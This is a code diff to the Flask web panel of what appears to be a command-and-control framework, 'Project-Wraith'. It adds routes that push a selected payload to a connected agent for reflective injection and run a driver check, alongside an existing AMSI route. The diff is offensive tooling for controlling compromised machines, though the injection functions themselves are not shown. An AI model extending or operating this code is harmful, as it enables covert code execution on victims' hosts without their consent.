@@ -1,5 +1,5 @@
 from apps.home import blueprint
-from flask import render_template, request, jsonify, redirect, url_for, send_from_directory
+from flask import render_template, request, jsonify, redirect, url_for, send_from_directory, session
 from flask_login import login_required
 from jinja2 import TemplateNotFound
 from apps import db
@@ -20,16 +20,6 @@ def operations():
     path = r"C:\Users\user\Desktop\Wraith\Project-Wraith\WebServer\apps\exploit\payload"
     files = [{'name': file.name} for file in os.scandir(path)]
     return render_template('home/operations.html', agents=agents, files=files)
-
-@blueprint.route('/select_file', methods=['POST'])
-def select_file():
-    arg = request.form.to_dict()
-    if arg != {}:
-        payload = arg['selected_file']
-    # Process the selected file as needed
-    print(f"Selected File: {payload}")
-    # Redirect or render another page as needed
-    return redirect(request.referrer)
 
 @blueprint.route('/agents.html', methods=["GET"])
 def agents_info():
@@ -137,3 +127,84 @@ def execute_amsi():
             window.alert("No Agent Selected");
             window.location.href = document.referrer;
         </script>"""
+
+@blueprint.route('/execute_reflective', methods=["POST"])
+def execute_reflective():
+    arg = request.form.to_dict()
+    if arg != {}:
+        agent = arg['selected_reflective_agent']
+        payload = arg['selected_payload']
+        client_id = db.execute("SELECT identifier FROM all_agents WHERE id=?", agent).fetchone()
+        client_id = str(client_id[0])
+        try:
+            with connections_lock:
+                if connections != []:
+                    for conn in connections:
+                        if conn[6] == client_id:
+                            conn.append(payload)
+                            reflectiveInjection(conn)
+                            return """
+                                <script>
+                                    window.alert("Reflective Injection Executed");
+                                    window.location.href = document.referrer;
+                                </script>"""
+                        else:
+                            return """
+                                <script>
+                                    window.alert("No Matching Identifier");
+                                    window.location.href = document.referrer;
+                                </script>"""
+                else:
+                    return """
+                        <script>
+                            window.alert("No Active Connections, Check Agents");
+                            window.location.href = document.referrer;
+                        </script>"""
+        except OSError:
+            time.sleep(5)
+    else:
+        return """
+        <script>
+            window.alert("No Agent or Payload Selected");
+            window.location.href = document.referrer;
+        </script>"""
+
+@blueprint.route("/execute_driver", methods=["POST"])
+def execute_driver():
+    arg = request.form.to_dict()
+    if arg != {}:
+        agent = arg['selected_driver_agent']
+        client_id = db.execute("SELECT identifier FROM all_agents WHERE id=?", agent).fetchone()
+        client_id = str(client_id[0])
+        try:
+            with connections_lock:
+                if connections != []:
+                    for conn in connections:
+                        if conn[6] == client_id:
+                            driverCheck(conn)
+                            return """
+                                <script>
+                                    window.alert("Driver Check Executed");
+                                    window.location.href = document.referrer;
+                                </script>"""
+                        else:
+                            return """
+                                <script>
+                                    window.alert("No Matching Identifier");
+                                    window.location.href = document.referrer;
+                                </script>"""
+                else:
+                    return """
+                        <script>
+                            window.alert("No Active Connections, Check Agents");
+                            window.location.href = document.referrer;
+                        </script>"""
+        except OSError:
+            time.sleep(5)
+    else:
+        return """
+        <script>
+            window.alert("No Agent Selected");
+            window.location.href = document.referrer;
+        </script>"""
+
